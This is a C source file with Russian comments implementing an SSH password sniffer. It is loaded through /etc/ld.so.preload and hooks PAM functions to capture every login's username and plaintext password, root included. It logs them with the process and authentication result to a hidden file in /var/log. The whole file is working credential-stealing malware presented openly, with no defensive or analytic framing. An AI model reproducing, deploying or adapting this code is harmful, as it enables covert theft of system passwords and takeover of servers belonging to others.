/**
 * Системный SSH Password Sniffer
 * Перехватывает все SSH пароли, включая root
 * 
 * Принцип работы:
 * 1. Внедряется через /etc/ld.so.preload
 * 2. Перехватывает функции PAM для всех процессов
 * 3. Получает логины и пароли при SSH аутентификации
 * 4. Записывает захваченные данные в скрытый лог-файл
 * 
 * Автор: Personaz1
 * GitHub: https://github.com/Personaz1/ScrScr
 */

#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <security/pam_appl.h>
#include <time.h>
#include <pwd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

// Путь к лог-файлу (скрытый файл в /var/log)
#define LOG_PATH "/var/log/.ssh_passwd.log"

// Оригинальные функции PAM, которые мы будем перехватывать
static int (*orig_pam_get_item)(const pam_handle_t *pamh, int item_type, const void **item) = NULL;
static int (*orig_pam_authenticate)(pam_handle_t *pamh, int flags) = NULL;
static int (*orig_pam_set_item)(pam_handle_t *pamh, int item_type, const void *item) = NULL;

// Буферы для хранения перехваченной информации об авторизации
static char last_username[256] = {0};  // Имя пользователя 
static char last_password[1024] = {0};  // Пароль
static int auth_result = 0;  // Результат авторизации (0 - неудача, 1 - успех)

/**
 * Записывает захваченные данные в лог-файл
 * Сохраняет: имя пользователя, пароль, время, PID процесса, командную строку и результат авторизации
 */
void log_auth_data() {
    // Получаем текущее время для метки в логе
    time_t now = time(NULL);
    char timestamp[64];
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
    
    // Получаем информацию о процессе для дополнительного контекста
    pid_t pid = getpid();
    char cmdline[1024] = "unknown";
    char process_path[256] = {0};
    
    // Попытка получить командную строку процесса из /proc
    snprintf(process_path, sizeof(process_path), "/proc/%d/cmdline", pid);
    FILE* cmd_file = fopen(process_path, "r");
    if (cmd_file) {
        size_t size = fread(cmdline, 1, sizeof(cmdline) - 1, cmd_file);
        if (size > 0) {
            // Заменяем нулевые байты на пробелы для читаемости
            for (size_t i = 0; i < size - 1; i++) {
                if (cmdline[i] == '\0') cmdline[i] = ' ';
            }
            cmdline[size] = '\0';
        }
        fclose(cmd_file);
    }
    
    // Создаем запись в лог-файле
    FILE* log = fopen(LOG_PATH, "a");
    if (log) {
        fprintf(log, "==== SSH AUTH CAPTURE [%s] ====\n", timestamp);
        fprintf(log, "Process: %s (PID: %d)\n", cmdline, pid);
        fprintf(log, "Username: %s\n", last_username);
        fprintf(log, "Password: %s\n", last_password);
        fprintf(log, "Result: %s\n", auth_result ? "SUCCESS" : "FAILED");
        fprintf(log, "===============================\n\n");
        fclose(log);
        
        // Устанавливаем безопасные права доступа (только root может читать)
        chmod(LOG_PATH, 0600);
    }
}

/**
 * Перехват pam_get_item - для получения имени пользователя
 * PAM_USER содержит имя пользователя, который пытается авторизоваться
 */
extern "C" int pam_get_item(const pam_handle_t *pamh, int item_type, const void **item) {
    // Ленивая инициализация оригинальной функции при первом вызове
    if (!orig_pam_get_item) {
        orig_pam_get_item = (int(*)(const pam_handle_t*, int, const void**))dlsym(RTLD_NEXT, "pam_get_item");
        if (!orig_pam_get_item) return PAM_SYSTEM_ERR;
    }
    
    // Вызов оригинальной функции
    int result = orig_pam_get_item(pamh, item_type, item);
    
    // Сохраняем имя пользователя, если это то, что мы ищем
    if (item_type == PAM_USER && result == PAM_SUCCESS && *item != NULL) {
        strncpy(last_username, (const char*)*item, sizeof(last_username) - 1);
        last_username[sizeof(last_username) - 1] = '\0';
    }
    
    return result;
}

/**
 * Перехват pam_set_item - для получения пароля
 * PAM_AUTHTOK содержит пароль, введенный пользователем
 */
extern "C" int pam_set_item(pam_handle_t *pamh, int item_type, const void *item) {
    // Ленивая инициализация оригинальной функции при первом вызове
    if (!orig_pam_set_item) {
        orig_pam_set_item = (int(*)(pam_handle_t*, int, const void*))dlsym(RTLD_NEXT, "pam_set_item");
        if (!orig_pam_set_item) return PAM_SYSTEM_ERR;
    }
    
    // Сохраняем пароль, если это токен аутентификации
    if (item_type == PAM_AUTHTOK && item != NULL) {
        strncpy(last_password, (const char*)item, sizeof(last_password) - 1);
        last_password[sizeof(last_password) - 1] = '\0';
    }
    
    // Вызов оригинальной функции
    return orig_pam_set_item(pamh, item_type, item);
}

/**
 * Перехват pam_authenticate - для определения результата авторизации
 * Эта функция вызывается после проверки логина/пароля
 */
extern "C" int pam_authenticate(pam_handle_t *pamh, int flags) {
    // Ленивая инициализация оригинальной функции при первом вызове
    if (!orig_pam_authenticate) {
        orig_pam_authenticate = (int(*)(pam_handle_t*, int))dlsym(RTLD_NEXT, "pam_authenticate");
        if (!orig_pam_authenticate) return PAM_SYSTEM_ERR;
    }
    
    // Вызываем оригинальную функцию проверки
    int result = orig_pam_authenticate(pamh, flags);
    
    // Если у нас уже есть имя пользователя и пароль, записываем результат
    if (last_username[0] != '\0' && last_password[0] != '\0') {
        auth_result = (result == PAM_SUCCESS);
        log_auth_data();
        
        // Очищаем буферы для безопасности (не оставляем пароли в памяти)
        memset(last_password, 0, sizeof(last_password));
    }
    
    return result;
}

/**
 * Функция инициализации - вызывается при загрузке библиотеки
 * Создает лог-файл и устанавливает права доступа
 */
static __attribute__((constructor)) void init(void) {
    // Убеждаемся, что лог-файл существует и имеет правильные права
    FILE* log = fopen(LOG_PATH, "a");
    if (log) {
        fprintf(log, "=== SSH Password Sniffer loaded (PID: %d) ===\n", getpid());
        fclose(log);
        chmod(LOG_PATH, 0600);
    }
}

/**
 * Функция деинициализации - вызывается при выгрузке библиотеки
 * Очищает чувствительные данные из памяти
 */
static __attribute__((destructor)) void fini(void) {
    // Очищаем чувствительные данные из памяти
    memset(last_username, 0, sizeof(last_username));
    memset(last_password, 0, sizeof(last_password));
} 